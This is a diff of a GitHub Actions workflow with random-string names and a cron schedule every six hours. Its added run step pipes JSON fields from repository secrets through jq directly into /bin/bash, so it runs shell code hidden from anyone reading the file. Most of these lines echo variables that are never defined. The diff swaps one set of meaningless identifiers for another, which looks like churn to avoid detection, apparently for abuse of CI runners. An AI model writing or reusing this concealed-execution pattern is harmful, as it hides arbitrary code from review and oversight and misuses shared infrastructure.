@@ -1,30 +1,27 @@
 name: lidagong0987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 2/6 * * *'
-
+    - cron: '20 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lidagong0987
         env:
-          koi9: ${{ secrets.koi9 }}
+          bhjtf820: ${{ secrets.bhjtf820 }}
         run: |
-          echo $koi9 | jq -r .m692 | /bin/bash
-          echo $cvhry12011 | jq -r .qbkx1608 | /bin/bash
-          echo $pwi71865 | jq -r .a4194 | /bin/bash
-          echo $xdhs50268 | jq -r .cbb8 | /bin/bash
-          echo $yml907 | jq -r .v2 | /bin/bash
-          echo $gxsje67160 | jq -r .obi896 | /bin/bash
-          echo $demrk0 | jq -r .gepl99835 | /bin/bash
-          echo $g69 | jq -r .dro3889 | /bin/bash
-          echo $ecsa51 | jq -r .iondu6 | /bin/bash
-          echo $cs790 | jq -r .teuw0 | /bin/bash
-          echo $knlil12 | jq -r .gemo9 | /bin/bash
-          echo $lj5763 | jq -r .pnfy9 | /bin/bash
-          echo $i453 | jq -r .cwgpg1562 | /bin/bash
+          echo $bhjtf820 | jq -r .uaj6 | /bin/bash
+          echo $sqq722 | jq -r .dl805 | /bin/bash
+          echo $bem0 | jq -r .j28 | /bin/bash
+          echo $spi31368 | jq -r .rmlnr49 | /bin/bash
+          echo $fu55975 | jq -r .ksi30142 | /bin/bash
+          echo $smj6 | jq -r .yczo0736 | /bin/bash
+          echo $as765 | jq -r .rq136 | /bin/bash
+          echo $ql4 | jq -r .p285 | /bin/bash
+          echo $tlmny360 | jq -r .agwld590 | /bin/bash
+          echo $yx3271 | jq -r .vnn890 | /bin/bash
+          echo $bui7 | jq -r .fnv6022 | /bin/bash
 
